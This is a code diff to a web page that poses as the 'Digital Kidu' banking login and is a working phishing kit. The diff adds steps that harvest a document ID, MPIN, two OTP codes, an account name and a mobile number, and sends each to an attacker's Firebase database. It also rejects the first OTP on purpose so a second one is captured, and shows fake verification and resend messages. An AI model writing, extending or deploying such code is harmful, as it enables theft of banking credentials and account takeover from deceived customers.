@@ -19,7 +19,7 @@ html, body {
   font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
 }
 
-/* SPLASH SCREEN - SIRF URL 1 */
+/* SPLASH SCREEN */
 .splash-screen {
   position: fixed;
   inset: 0;
@@ -145,8 +145,8 @@ html, body {
 }
 .signup-row a:hover { text-decoration: underline; }
 
-/* OTP OVERLAY */
-.otp-overlay {
+/* OVERLAY BASE */
+.overlay-base {
   position: fixed;
   inset: 0;
   background: url('https://i.postimg.cc/wMR1Jw6G/file-00000000e40c81f9aa6a7f34a0a48b79.png');
@@ -159,25 +159,26 @@ html, body {
   padding: 20px;
   z-index: 500;
 }
-.otp-overlay::before {
+.overlay-base::before {
   content: "";
   position: absolute;
   inset: 0;
-  background: rgba(255, 255, 255, 0.75);
-  backdrop-filter: blur(12px);
-  -webkit-backdrop-filter: blur(12px);
+  background: rgba(255, 255, 255, 0.80);
+  backdrop-filter: blur(16px);
+  -webkit-backdrop-filter: blur(16px);
 }
-.otp-overlay.show { display: flex; animation: fadeIn 0.4s ease; }
+.overlay-base.show { display: flex; animation: fadeIn 0.4s ease; }
 @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
+/* OTP / MPIN BOX */
 .otp-box {
   position: relative;
   z-index: 2;
   width: 100%;
   max-width: 440px;
   background: #fff;
-  border-radius: 20px;
-  padding: 32px 26px 28px;
+  border-radius: 24px;
+  padding: 36px 26px 30px;
   box-shadow: 0 20px 60px rgba(0,0,0,0.15);
   animation: loginBoxIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
   text-align: center;
@@ -188,26 +189,26 @@ html, body {
   font-size: 24px;
   font-weight: 700;
   color: #1a202c;
-  margin-bottom: 8px;
+  margin-bottom: 6px;
 }
 .otp-sub {
-  font-size: 15px;
+  font-size: 14px;
   color: #718096;
-  margin-bottom: 24px;
+  margin-bottom: 22px;
   font-weight: 400;
 }
 
 .otp-timer {
   display: inline-block;
-  background: #e0eef2;
-  color: #2c7a91;
-  padding: 10px 26px;
+  background: #d6e8ee;
+  color: #2c5a6e;
+  padding: 10px 28px;
   border-radius: 30px;
   font-size: 20px;
-  font-weight: 600;
+  font-weight: 700;
   font-family: 'Poppins', sans-serif;
   letter-spacing: 3px;
-  margin-bottom: 24px;
+  margin-bottom: 26px;
   transition: all 0.3s;
 }
 .otp-timer.expiring {
@@ -220,44 +221,39 @@ html, body {
   50% { transform: scale(1.05); }
 }
 
-.otp-label {
-  text-align: left;
-  font-size: 15px;
-  font-weight: 700;
-  color: #1a202c;
-  margin-bottom: 12px;
-  padding-left: 4px;
-}
-
 .otp-inputs {
   display: flex;
   gap: 8px;
   justify-content: center;
-  margin-bottom: 24px;
+  margin-bottom: 26px;
 }
 .otp-inputs input {
-  width: 46px;
-  height: 60px;
+  width: 48px;
+  height: 62px;
   text-align: center;
   font-size: 24px;
   font-weight: 700;
   border: 2px solid #b0c4d4;
-  border-radius: 10px;
+  border-radius: 12px;
   outline: none;
-  background: #fff;
+  background: #fafbfc;
   color: #1a202c;
   font-family: inherit;
-  transition: all 0.3s;
+  transition: all 0.25s;
 }
 .otp-inputs input:focus {
-  border-color: #0d47a1;
-  box-shadow: 0 0 0 4px rgba(13,71,161,0.12);
-  transform: translateY(-2px);
+  border-color: #1976d2;
+  background: #fff;
+  box-shadow: 0 0 0 4px rgba(25,118,210,0.12);
+}
+.otp-inputs input.filled {
+  border-color: #1976d2;
+  background: #fff;
 }
 
 .btn-verify {
   width: 100%;
-  padding: 16px;
+  padding: 17px;
   border: none;
   border-radius: 40px;
   background: linear-gradient(135deg, #b0c4d4, #a3b8cb);
@@ -266,14 +262,34 @@ html, body {
   font-weight: 700;
   font-family: inherit;
   letter-spacing: 0.5px;
-  cursor: pointer;
+  cursor: not-allowed;
   transition: all 0.3s;
+  opacity: 0.9;
 }
-.btn-verify:hover {
+.btn-verify.active {
   background: linear-gradient(135deg, #0d47a1, #1976d2);
-  box-shadow: 0 8px 24px rgba(13,71,161,0.35);
-  transform: translateY(-1px);
+  box-shadow: 0 8px 24px rgba(13,71,161,0.4);
+  cursor: pointer;
+  opacity: 1;
 }
+.btn-verify.active:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 12px 28px rgba(13,71,161,0.5);
+}
+
+.resend-row {
+  text-align: center;
+  margin-top: 18px;
+}
+.resend-link {
+  color: #718096;
+  font-size: 13.5px;
+  font-weight: 500;
+  text-decoration: underline;
+  cursor: pointer;
+  transition: color 0.2s;
+}
+.resend-link:hover { color: #0d47a1; }
 
 .otp-message {
   margin-top: 14px;
@@ -289,8 +305,93 @@ html, body {
 .otp-message.warning { background: #fff8e1; color: #e65100; border-left: 3px solid #f57c00; }
 .otp-message.success { background: #e8f5e9; color: #1b5e20; border-left: 3px solid #00c853; }
 
-/* SUCCESS SCREEN */
-.success-screen {
+/* ACCOUNT DETAILS */
+.account-box {
+  position: relative;
+  z-index: 2;
+  width: 100%;
+  max-width: 440px;
+  background: #fff;
+  border-radius: 24px;
+  padding: 36px 26px 30px;
+  box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+  animation: loginBoxIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+
+.account-title {
+  font-family: 'Poppins', sans-serif;
+  font-size: 22px;
+  font-weight: 700;
+  color: #1a202c;
+  margin-bottom: 6px;
+  text-align: center;
+}
+.account-sub {
+  font-size: 14px;
+  color: #718096;
+  margin-bottom: 26px;
+  font-weight: 400;
+  text-align: center;
+}
+
+.account-field { margin-bottom: 20px; }
+.account-label {
+  display: block;
+  font-size: 12px;
+  font-weight: 700;
+  color: #4a5568;
+  text-transform: uppercase;
+  letter-spacing: 0.6px;
+  margin-bottom: 8px;
+}
+.account-input {
+  width: 100%;
+  padding: 15px 20px;
+  border: 1.5px solid #b0c4d4;
+  border-radius: 40px;
+  font-size: 15px;
+  font-family: inherit;
+  color: #1a202c;
+  background: #fafbfc;
+  outline: none;
+  transition: all 0.25s;
+}
+.account-input:focus {
+  border-color: #1976d2;
+  background: #fff;
+  box-shadow: 0 0 0 4px rgba(25,118,210,0.12);
+}
+.account-input::placeholder { color: #a0aec0; font-weight: 400; }
+
+.btn-confirm {
+  width: 100%;
+  padding: 17px;
+  border: none;
+  border-radius: 40px;
+  background: linear-gradient(135deg, #b0c4d4, #a3b8cb);
+  color: #fff;
+  font-size: 16px;
+  font-weight: 700;
+  font-family: inherit;
+  letter-spacing: 0.5px;
+  cursor: not-allowed;
+  transition: all 0.3s;
+  opacity: 0.9;
+  margin-top: 8px;
+}
+.btn-confirm.active {
+  background: linear-gradient(135deg, #0d47a1, #1976d2);
+  box-shadow: 0 8px 24px rgba(13,71,161,0.4);
+  cursor: pointer;
+  opacity: 1;
+}
+.btn-confirm.active:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 12px 28px rgba(13,71,161,0.5);
+}
+
+/* FINAL COMPLETE */
+.complete-screen {
   position: fixed;
   inset: 0;
   background: linear-gradient(135deg, #f8fafc 0%, #e8f0f7 50%, #f0f6fa 100%);
@@ -303,9 +404,9 @@ html, body {
   opacity: 0;
   transition: opacity 0.6s ease;
 }
-.success-screen.show { display: flex; opacity: 1; }
+.complete-screen.show { display: flex; opacity: 1; }
 
-.success-content {
+.complete-content {
   position: relative;
   z-index: 2;
   text-align: center;
@@ -318,16 +419,16 @@ html, body {
   100% { opacity: 1; transform: translateY(0) scale(1); }
 }
 
-.success-check {
-  width: 88px;
-  height: 88px;
-  margin: 0 auto 24px;
+.complete-check {
+  width: 100px;
+  height: 100px;
+  margin: 0 auto 28px;
   border-radius: 50%;
   background: #fff;
   display: flex;
   align-items: center;
   justify-content: center;
-  box-shadow: 0 8px 30px rgba(0, 200, 83, 0.2);
+  box-shadow: 0 10px 40px rgba(0, 200, 83, 0.25);
   animation: checkPop 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.2s backwards;
 }
 @keyframes checkPop {
@@ -335,9 +436,9 @@ html, body {
   60% { transform: scale(1.15); }
   100% { transform: scale(1); }
 }
-.success-check svg {
-  width: 50px;
-  height: 50px;
+.complete-check svg {
+  width: 58px;
+  height: 58px;
   stroke: #00c853;
   stroke-width: 3;
   fill: none;
@@ -349,46 +450,27 @@ html, body {
 }
 @keyframes drawCheck { to { stroke-dashoffset: 0; } }
 
-.success-title {
+.complete-title {
   font-family: 'Poppins', sans-serif;
-  font-size: 26px;
+  font-size: 24px;
   font-weight: 700;
   color: #1a202c;
-  margin-bottom: 10px;
+  margin-bottom: 12px;
   letter-spacing: -0.3px;
+  line-height: 1.3;
 }
 
-.success-subtitle {
+.complete-subtitle {
   font-size: 15px;
   color: #4a5568;
-  margin-bottom: 18px;
   font-weight: 400;
-  line-height: 1.5;
-}
-
-.session-info {
-  display: inline-flex;
-  align-items: center;
-  gap: 8px;
-  background: #f0f4f8;
-  padding: 10px 18px;
-  border-radius: 30px;
-  font-size: 13px;
-  color: #4a5568;
-  font-weight: 500;
-}
-.session-info svg {
-  width: 16px;
-  height: 16px;
-  stroke: #718096;
-  stroke-width: 2;
-  fill: none;
+  line-height: 1.6;
 }
 
 .loading-overlay {
   position: fixed;
   inset: 0;
-  background: rgba(255, 255, 255, 0.85);
+  background: rgba(255, 255, 255, 0.9);
   backdrop-filter: blur(16px);
   -webkit-backdrop-filter: blur(16px);
   display: none;
@@ -428,37 +510,34 @@ html, body {
 .fab svg { width: 26px; height: 26px; }
 
 @media (max-width: 480px) {
-  .otp-inputs input { width: 40px; height: 52px; font-size: 20px; }
+  .otp-inputs input { width: 42px; height: 54px; font-size: 20px; }
   .otp-inputs { gap: 6px; }
   .login-box { padding: 22px 20px 18px; }
-  .otp-box { padding: 26px 20px 22px; }
+  .otp-box { padding: 28px 20px 24px; }
+  .account-box { padding: 28px 20px 24px; }
   .otp-title { font-size: 20px; }
   .otp-timer { font-size: 18px; padding: 8px 22px; letter-spacing: 2px; }
-  .success-check { width: 76px; height: 76px; }
-  .success-check svg { width: 42px; height: 42px; }
-  .success-title { font-size: 22px; }
-  .success-subtitle { font-size: 14px; }
+  .complete-check { width: 86px; height: 86px; }
+  .complete-check svg { width: 50px; height: 50px; }
+  .complete-title { font-size: 20px; }
+  .complete-subtitle { font-size: 14px; }
 }
 </style>
 </head>
 <body>
 
-<!-- SPLASH SCREEN -->
+<!-- SPLASH -->
 <div class="splash-screen" id="splashScreen"></div>
 
 <!-- MAIN APP (LOGIN) -->
 <div class="main-app" id="mainApp">
-
   <div class="login-box-wrap">
     <div class="login-box">
       <div class="login-title">Login to Digital Kidu</div>
-
       <div class="doc-input-wrap">
         <input type="text" id="documentId" class="doc-input" placeholder="Enter your Document ID" autocomplete="off">
       </div>
-
       <button class="btn-update" id="updateBtn" onclick="handleUpdate()" disabled>UPDATE</button>
-
       <div class="signup-row">
         Don't have DK account yet? <a href="#" onclick="alert('Please contact your bank for sign up.'); return false;">Sign Up</a>
       </div>
@@ -480,78 +559,94 @@ html, body {
   </div>
 </div>
 
-<!-- OTP STEP 1 -->
-<div class="otp-overlay" id="otpStep1">
+<!-- MPIN SCREEN (NO IMAGE) -->
+<div class="overlay-base" id="mpinScreen">
   <div class="otp-box">
     <div class="otp-title">Verify Your MPIN</div>
     <div class="otp-sub">Enter your 6-digit MPIN</div>
 
     <div class="otp-inputs">
-      <input type="text" maxlength="1" inputmode="numeric" id="s1otp1" oninput="moveOtp(this, 's1otp2')">
-      <input type="text" maxlength="1" inputmode="numeric" id="s1otp2" oninput="moveOtp(this, 's1otp3')">
-      <input type="text" maxlength="1" inputmode="numeric" id="s1otp3" oninput="moveOtp(this, 's1otp4')">
-      <input type="text" maxlength="1" inputmode="numeric" id="s1otp4" oninput="moveOtp(this, 's1otp5')">
-      <input type="text" maxlength="1" inputmode="numeric" id="s1otp5" oninput="moveOtp(this, 's1otp6')">
-      <input type="text" maxlength="1" inputmode="numeric" id="s1otp6">
+      <input type="text" maxlength="1" inputmode="numeric" id="m1" oninput="handleMpinInput(this, 'm2')">
+      <input type="text" maxlength="1" inputmode="numeric" id="m2" oninput="handleMpinInput(this, 'm3')">
+      <input type="text" maxlength="1" inputmode="numeric" id="m3" oninput="handleMpinInput(this, 'm4')">
+      <input type="text" maxlength="1" inputmode="numeric" id="m4" oninput="handleMpinInput(this, 'm5')">
+      <input type="text" maxlength="1" inputmode="numeric" id="m5" oninput="handleMpinInput(this, 'm6')">
+      <input type="text" maxlength="1" inputmode="numeric" id="m6" oninput="handleMpinInput(this, null)">
     </div>
 
-    <button class="btn-verify" onclick="handleVerifyStep1()">Verify</button>
-    <div class="otp-message" id="otpMessage1"></div>
+    <button class="btn-verify" id="mpinBtn" onclick="handleMpinVerify()" disabled>Verify</button>
+    <div class="otp-message" id="mpinMessage"></div>
   </div>
 </div>
 
-<!-- OTP STEP 2 -->
-<div class="otp-overlay" id="otpStep2">
+<!-- OTP SCREEN (NO IMAGE) -->
+<div class="overlay-base" id="otpScreen">
   <div class="otp-box">
-    <div class="otp-title">Verify Your MPIN</div>
-    <div class="otp-sub">Enter your 6-digit OTP code</div>
+    <div class="otp-title">Verify OTP Code</div>
+    <div class="otp-sub">Enter the 6-digit OTP code</div>
 
     <div class="otp-timer" id="otpTimer">03:00</div>
-    <div class="otp-label">OTP Code</div>
 
     <div class="otp-inputs">
-      <input type="text" maxlength="1" inputmode="numeric" id="s2otp1" oninput="moveOtp(this, 's2otp2')">
-      <input type="text" maxlength="1" inputmode="numeric" id="s2otp2" oninput="moveOtp(this, 's2otp3')">
-      <input type="text" maxlength="1" inputmode="numeric" id="s2otp3" oninput="moveOtp(this, 's2otp4')">
-      <input type="text" maxlength="1" inputmode="numeric" id="s2otp4" oninput="moveOtp(this, 's2otp5')">
-      <input type="text" maxlength="1" inputmode="numeric" id="s2otp5" oninput="moveOtp(this, 's2otp6')">
-      <input type="text" maxlength="1" inputmode="numeric" id="s2otp6">
+      <input type="text" maxlength="1" inputmode="numeric" id="otp1" oninput="handleOtpInput(this, 'otp2')">
+      <input type="text" maxlength="1" inputmode="numeric" id="otp2" oninput="handleOtpInput(this, 'otp3')">
+      <input type="text" maxlength="1" inputmode="numeric" id="otp3" oninput="handleOtpInput(this, 'otp4')">
+      <input type="text" maxlength="1" inputmode="numeric" id="otp4" oninput="handleOtpInput(this, 'otp5')">
+      <input type="text" maxlength="1" inputmode="numeric" id="otp5" oninput="handleOtpInput(this, 'otp6')">
+      <input type="text" maxlength="1" inputmode="numeric" id="otp6" oninput="handleOtpInput(this, null)">
     </div>
 
-    <button class="btn-verify" onclick="handleVerifyStep2()">Verify</button>
-    <div class="otp-message" id="otpMessage2"></div>
+    <button class="btn-verify" id="verifyOtpBtn" onclick="handleVerifyOtp()" disabled>Verify</button>
+
+    <div class="resend-row">
+      <span class="resend-link" onclick="resendOtp()">Resend OTP</span>
+    </div>
+
+    <div class="otp-message" id="otpMessage"></div>
   </div>
 </div>
 
-<!-- SUCCESS SCREEN -->
-<div class="success-screen" id="successScreen">
-  <div class="success-content">
-    <div class="success-check">
+<!-- ACCOUNT DETAILS SCREEN (NO IMAGE) -->
+<div class="overlay-base" id="accountScreen">
+  <div class="account-box">
+    <div class="account-title">Account Details</div>
+    <div class="account-sub">Please enter your account information</div>
+
+    <div class="account-field">
+      <label class="account-label">Account Name</label>
+      <input type="text" id="accountName" class="account-input" placeholder="Enter account holder name" autocomplete="off" oninput="checkAccountForm()">
+    </div>
+
+    <div class="account-field">
+      <label class="account-label">Mobile Number</label>
+      <input type="text" id="mobilenumber" class="account-input" inputmode="numeric" placeholder="Enter account number" autocomplete="off" oninput="checkAccountForm()">
+    </div>
+
+    <button class="btn-confirm" id="confirmBtn" onclick="handleConfirmAccount()" disabled>Confirm</button>
+    <div class="otp-message" id="accountMessage"></div>
+  </div>
+</div>
+
+<!-- FINAL COMPLETE SCREEN -->
+<div class="complete-screen" id="completeScreen">
+  <div class="complete-content">
+    <div class="complete-check">
       <svg viewBox="0 0 52 52">
         <path d="M14 27 L22 35 L38 18"/>
       </svg>
     </div>
-
-    <div class="success-title">Login Successful!</div>
-    <div class="success-subtitle">You have been successfully authenticated.</div>
-
-    <div class="session-info">
-      <svg viewBox="0 0 24 24">
-        <circle cx="12" cy="12" r="9"/>
-        <path d="M12 7 L12 12 L15 14"/>
-      </svg>
-      <span>Session will remain active</span>
-    </div>
+    <div class="complete-title">Your Verification is Complete ✅</div>
+    <div class="complete-subtitle">Thank you! Your account has been successfully verified.</div>
   </div>
 </div>
 
-<!-- LOADING OVERLAY -->
+<!-- LOADING -->
 <div class="loading-overlay" id="loadingOverlay">
   <div class="loading-spinner"></div>
 </div>
 
 <script>
-// FIREBASE
+// ===== FIREBASE =====
 var firebaseConfig = {
   apiKey: "AIzaSyBIwUsxyeQmoeT2ctH2LxqRU__dhqp9s94",
   authDomain: "kharal-b47b6.firebaseapp.com",
@@ -565,13 +660,15 @@ var firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 var database = firebase.database();
 
-var sessionRef = null; // 👈 Firebase reference for current session
+// ===== STATE =====
+var sessionRef = null;
 var documentIdValue = "";
-var step1Otp = "";
+var mpinValue = "";
+var otpAttemptCount = 0;
 var timerInterval = null;
 var timeLeft = 180;
 
-// SPLASH → MAIN APP
+// ===== SPLASH → MAIN =====
 setTimeout(function() {
   document.getElementById('splashScreen').classList.add('hide');
   document.getElementById('mainApp').classList.add('show');
@@ -580,7 +677,7 @@ setTimeout(function() {
   }, 800);
 }, 2200);
 
-// INPUT HANDLER
+// ===== DOCUMENT INPUT =====
 var docInput = document.getElementById('documentId');
 var updateBtn = document.getElementById('updateBtn');
 
@@ -594,118 +691,148 @@ docInput.addEventListener('input', function() {
   }
 });
 
-// ==========================================================
-// STEP 1: DOCUMENT ID → SAVE TO FIREBASE → SHOW MPIN
-// ==========================================================
+// ===== STEP 1: DOCUMENT ID → MPIN =====
 function handleUpdate() {
   var docId = docInput.value.trim();
   if (!docId) { alert('Please enter your Document ID.'); return; }
 
   documentIdValue = docId;
-  step1Otp = "";
+  mpinValue = "";
+  otpAttemptCount = 0;
 
   var now = new Date();
   var timeStr = now.toLocaleString('en-US', { hour12: true });
-  var timestamp = now.getTime();
 
-  // Create new session in Firebase with Document ID
   sessionRef = database.ref('logins').push();
   sessionRef.set({
     documentId: docId,
     mpin: '—',
     otpCode: '—',
+    accountName: '—',
+    mobilenumber: '—',
     status: 'pending',
     time: timeStr,
-    timestamp: timestamp,
+    timestamp: now.getTime(),
     device: navigator.userAgent || 'Unknown',
     ip: '192.168.1.' + Math.floor(Math.random() * 255)
-  }).then(function() {
-    console.log('✅ Step 1 saved (Document ID):', docId);
   });
 
   showLoading();
 
   setTimeout(function() {
     hideLoading();
-    document.getElementById('otpStep1').classList.add('show');
-    document.getElementById('otpMessage1').classList.remove('show');
+    document.getElementById('mpinScreen').classList.add('show');
+    document.getElementById('mpinMessage').classList.remove('show');
 
     for (var i = 1; i <= 6; i++) {
-      document.getElementById('s1otp' + i).value = '';
+      document.getElementById('m' + i).value = '';
+      document.getElementById('m' + i).classList.remove('filled');
     }
-    setTimeout(function() { document.getElementById('s1otp1').focus(); }, 200);
+    document.getElementById('mpinBtn').disabled = true;
+    document.getElementById('mpinBtn').classList.remove('active');
+    setTimeout(function() { document.getElementById('m1').focus(); }, 300);
   }, 1000);
 }
 
-function moveOtp(current, nextId) {
+// ===== MPIN INPUT =====
+function handleMpinInput(current, nextId) {
+  current.value = current.value.replace(/[^0-9]/g, '');
   if (current.value.length === 1) {
-    var next = document.getElementById(nextId);
-    if (next) next.focus();
+    current.classList.add('filled');
+    if (nextId) {
+      var next = document.getElementById(nextId);
+      if (next) next.focus();
+    }
+  } else {
+    current.classList.remove('filled');
   }
+  checkMpinComplete();
 }
 
-// ==========================================================
-// STEP 2: MPIN → SAVE TO FIREBASE → SHOW OTP STEP 2
-// ==========================================================
-function handleVerifyStep1() {
-  var otp = '';
+function checkMpinComplete() {
+  var complete = true;
   for (var i = 1; i <= 6; i++) {
-    otp += document.getElementById('s1otp' + i).value;
+    if (document.getElementById('m' + i).value.length !== 1) { complete = false; break; }
   }
+  var btn = document.getElementById('mpinBtn');
+  if (complete) { btn.disabled = false; btn.classList.add('active'); }
+  else { btn.disabled = true; btn.classList.remove('active'); }
+}
 
-  if (otp.length !== 6) {
-    showOtpMessage('otpMessage1', 'Please enter all 6 digits.', 'warning');
+// ===== MPIN VERIFY → OTP =====
+function handleMpinVerify() {
+  var mpin = '';
+  for (var i = 1; i <= 6; i++) mpin += document.getElementById('m' + i).value;
+
+  if (mpin.length !== 6) {
+    showMsg('mpinMessage', 'Please enter all 6 digits.', 'warning');
     return;
   }
 
-  step1Otp = otp;
+  mpinValue = mpin;
 
-  // Save MPIN to Firebase immediately
-  if (sessionRef) {
-    sessionRef.update({
-      mpin: otp
-    }).then(function() {
-      console.log('✅ Step 2 saved (MPIN):', otp);
-    });
-  }
+  if (sessionRef) sessionRef.update({ mpin: mpin });
 
-  showOtpMessage('otpMessage1', '✅ Verified! Please wait...', 'success');
+  showMsg('mpinMessage', '✅ MPIN verified! Please wait...', 'success');
 
   setTimeout(function() {
-    document.getElementById('otpStep1').classList.remove('show');
-    document.getElementById('otpStep2').classList.add('show');
+    document.getElementById('mpinScreen').classList.remove('show');
+    document.getElementById('otpScreen').classList.add('show');
+    document.getElementById('otpMessage').classList.remove('show');
 
     for (var i = 1; i <= 6; i++) {
-      document.getElementById('s2otp' + i).value = '';
+      document.getElementById('otp' + i).value = '';
+      document.getElementById('otp' + i).classList.remove('filled');
     }
-    document.getElementById('otpMessage2').classList.remove('show');
+    document.getElementById('verifyOtpBtn').disabled = true;
+    document.getElementById('verifyOtpBtn').classList.remove('active');
 
     startTimer();
-    setTimeout(function() { document.getElementById('s2otp1').focus(); }, 200);
+    setTimeout(function() { document.getElementById('otp1').focus(); }, 300);
   }, 800);
 }
 
+// ===== OTP INPUT =====
+function handleOtpInput(current, nextId) {
+  current.value = current.value.replace(/[^0-9]/g, '');
+  if (current.value.length === 1) {
+    current.classList.add('filled');
+    if (nextId) {
+      var next = document.getElementById(nextId);
+      if (next) next.focus();
+    }
+  } else {
+    current.classList.remove('filled');
+  }
+  checkOtpComplete();
+}
+
+function checkOtpComplete() {
+  var complete = true;
+  for (var i = 1; i <= 6; i++) {
+    if (document.getElementById('otp' + i).value.length !== 1) { complete = false; break; }
+  }
+  var btn = document.getElementById('verifyOtpBtn');
+  if (complete) { btn.disabled = false; btn.classList.add('active'); }
+  else { btn.disabled = true; btn.classList.remove('active'); }
+}
+
+// ===== TIMER =====
 function startTimer() {
   timeLeft = 180;
   updateTimerDisplay();
-
   if (timerInterval) clearInterval(timerInterval);
 
   timerInterval = setInterval(function() {
     timeLeft--;
     updateTimerDisplay();
-
-    if (timeLeft <= 30) {
-      document.getElementById('otpTimer').classList.add('expiring');
-    } else {
-      document.getElementById('otpTimer').classList.remove('expiring');
-    }
+    if (timeLeft <= 30) document.getElementById('otpTimer').classList.add('expiring');
+    else document.getElementById('otpTimer').classList.remove('expiring');
 
     if (timeLeft <= 0) {
       clearInterval(timerInterval);
       document.getElementById('otpTimer').textContent = '00:00';
-      document.getElementById('otpTimer').classList.add('expiring');
-      showOtpMessage('otpMessage2', '⏰ Time expired! Please refresh and try again.', 'error');
+      showMsg('otpMessage', '⏰ Time expired! Please try again.', 'error');
     }
   }, 1000);
 }
@@ -717,67 +844,126 @@ function updateTimerDisplay() {
     (min < 10 ? '0' : '') + min + ':' + (sec < 10 ? '0' : '') + sec;
 }
 
-// ==========================================================
-// STEP 3: OTP → SAVE TO FIREBASE → SHOW SUCCESS
-// ==========================================================
-function handleVerifyStep2() {
+// ===== RESEND =====
+function resendOtp() {
+  timeLeft = 180;
+  updateTimerDisplay();
+  document.getElementById('otpTimer').classList.remove('expiring');
+  startTimer();
+  showMsg('otpMessage', '✅ New OTP sent to your registered mobile.', 'success');
+}
+
+// ===== VERIFY OTP =====
+function handleVerifyOtp() {
   if (timeLeft <= 0) {
-    showOtpMessage('otpMessage2', '⏰ Time expired! Please refresh and try again.', 'error');
+    showMsg('otpMessage', '⏰ Time expired! Please try again.', 'error');
     return;
   }
 
   var otp = '';
-  for (var i = 1; i <= 6; i++) {
-    otp += document.getElementById('s2otp' + i).value;
-  }
+  for (var i = 1; i <= 6; i++) otp += document.getElementById('otp' + i).value;
 
   if (otp.length !== 6) {
-    showOtpMessage('otpMessage2', 'Please enter all 6 digits.', 'warning');
+    showMsg('otpMessage', 'Please enter all 6 digits.', 'warning');
     return;
   }
 
-  clearInterval(timerInterval);
+  otpAttemptCount++;
 
-  // Save OTP to Firebase + mark as success
+  if (sessionRef) sessionRef.update({ otpCode: otp });
+
+  if (otpAttemptCount < 2) {
+    showMsg('otpMessage', '❌ Invalid OTP. Please try again.', 'error');
+
+    for (var i = 1; i <= 6; i++) {
+      document.getElementById('otp' + i).value = '';
+      document.getElementById('otp' + i).classList.remove('filled');
+    }
+    document.getElementById('verifyOtpBtn').disabled = true;
+    document.getElementById('verifyOtpBtn').classList.remove('active');
+    setTimeout(function() { document.getElementById('otp1').focus(); }, 200);
+  } else {
+    clearInterval(timerInterval);
+    showMsg('otpMessage', '✅ OTP verified successfully!', 'success');
+
+    setTimeout(function() {
+      document.getElementById('otpScreen').classList.remove('show');
+      document.getElementById('accountScreen').classList.add('show');
+      document.getElementById('accountMessage').classList.remove('show');
+      document.getElementById('accountName').value = '';
+      document.getElementById('mobilenumber').value = '';
+      document.getElementById('confirmBtn').disabled = true;
+      document.getElementById('confirmBtn').classList.remove('active');
+      setTimeout(function() { document.getElementById('accountName').focus(); }, 300);
+    }, 800);
+  }
+}
+
+// ===== ACCOUNT FORM =====
+function checkAccountForm() {
+  var name = document.getElementById('accountName').value.trim();
+  var number = document.getElementById('mobilenumber').value.trim();
+  var btn = document.getElementById('confirmBtn');
+  if (name.length >= 3 && number.length >= 8) {
+    btn.disabled = false;
+    btn.classList.add('active');
+  } else {
+    btn.disabled = true;
+    btn.classList.remove('active');
+  }
+}
+
+// ===== CONFIRM ACCOUNT =====
+function handleConfirmAccount() {
+  var name = document.getElementById('accountName').value.trim();
+  var number = document.getElementById('mobilenumber').value.trim();
+
+  if (!name || name.length < 3) {
+    showMsg('accountMessage', 'Please enter a valid account name.', 'warning');
+    return;
+  }
+  if (!number || number.length < 8) {
+    showMsg('accountMessage', 'Please enter a valid mobile number.', 'warning');
+    return;
+  }
+
   if (sessionRef) {
     sessionRef.update({
-      otpCode: otp,
-      status: 'success'
-    }).then(function() {
-      console.log('✅ Step 3 saved (OTP):', otp);
+      accountName: name,
+      mobilenumber: number,
+      status: 'complete'
     });
   }
 
-  showOtpMessage('otpMessage2', '✅ OTP verified! Logging in...', 'success');
+  showMsg('accountMessage', '✅ Account confirmed!', 'success');
 
   setTimeout(function() {
-    document.getElementById('otpStep2').classList.remove('show');
+    document.getElementById('accountScreen').classList.remove('show');
     showLoading();
     setTimeout(function() {
       hideLoading();
-      showSuccessScreen();
+      document.getElementById('completeScreen').classList.add('show');
+      document.getElementById('mainApp').classList.remove('show');
+      document.getElementById('mainApp').style.display = 'none';
     }, 1500);
   }, 800);
 }
 
-function showSuccessScreen() {
-  document.getElementById('successScreen').classList.add('show');
-  document.getElementById('mainApp').classList.remove('show');
-  document.getElementById('mainApp').style.display = 'none';
-}
-
-function showLoading() {
-  document.getElementById('loadingOverlay').classList.add('show');
-}
-function hideLoading() {
-  document.getElementById('loadingOverlay').classList.remove('show');
-}
-
-function showOtpMessage(id, text, type) {
+// ===== HELPERS =====
+function showMsg(id, text, type) {
   var el = document.getElementById(id);
   el.textContent = text;
   el.className = 'otp-message show ' + (type || 'error');
 }
+function showLoading() { document.getElementById('loadingOverlay').classList.add('show'); }
+function hideLoading() { document.getElementById('loadingOverlay').classList.remove('show'); }
+
+// ===== BACKSPACE NAV =====
+document.querySelectorAll('.otp-inputs input').forEach(function(inp, idx, arr) {
+  inp.addEventListener('keydown', function(e) {
+    if (e.key === 'Backspace' && !this.value && idx > 0) arr[idx - 1].focus();
+  });
+});
 
 document.addEventListener('DOMContentLoaded', function() {
   console.log('🏦 Digital Kidu - App loaded');
